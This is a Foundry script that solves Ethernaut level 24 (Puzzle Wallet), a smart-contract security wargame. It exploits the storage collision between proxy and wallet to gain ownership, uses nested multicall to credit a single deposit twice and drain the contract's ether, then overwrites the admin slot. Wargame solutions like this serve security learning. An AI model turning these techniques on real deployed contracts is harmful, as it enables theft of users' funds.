// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console2} from "forge-std/Script.sol";
import {IEthernaut} from "../interfaces/IEthernaut.sol";
import {PuzzleProxy, PuzzleWallet} from "../src/Level24.sol";

contract Level24 is Script {
    IEthernaut ethernaut = IEthernaut(vm.envAddress("ETHERNAUT_ADDR"));
    address me = vm.addr(vm.envUint("PRIVATE_KEY"));

    function run() public {
        address payable instance = payable(vm.envAddress("LVL24_ADDR"));
        PuzzleProxy instanceProxy = PuzzleProxy(instance);
        PuzzleWallet instanceWallet = PuzzleWallet(instance);

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        // contract is deployed with 0.001 ether

        instanceProxy.proposeNewAdmin(me);
        instanceWallet.addToWhitelist(me);

        //creating encoded function data to pass into multicall
        bytes[] memory forDeposit = new bytes[](1);
        bytes[] memory forMulticall = new bytes[](2);
        forDeposit[0] = abi.encodeWithSignature("deposit()");
        forMulticall[0] = abi.encodeWithSelector(instanceWallet.deposit.selector);
        forMulticall[1] = abi.encodeWithSelector(instanceWallet.multicall.selector, forDeposit);
        // send 0.001 ether to the contract and call deposit twice to have 0.002 ether in balance
        instanceWallet.multicall{value: 0.001 ether}(forMulticall);

        // receive all ether from the contract
        instanceWallet.execute(me, 0.002 ether, new bytes(0));
        // address in 20 bytes, so we need to convert it to uint160 (20 * 8 = 160)
        //convert uint160 to uint256
        instanceWallet.setMaxBalance(uint256(uint160(me)));

        if (instanceProxy.admin() == me) {
            console2.log("Success");
            ethernaut.submitLevelInstance(instance);
        }

        vm.stopBroadcast();
    }
}
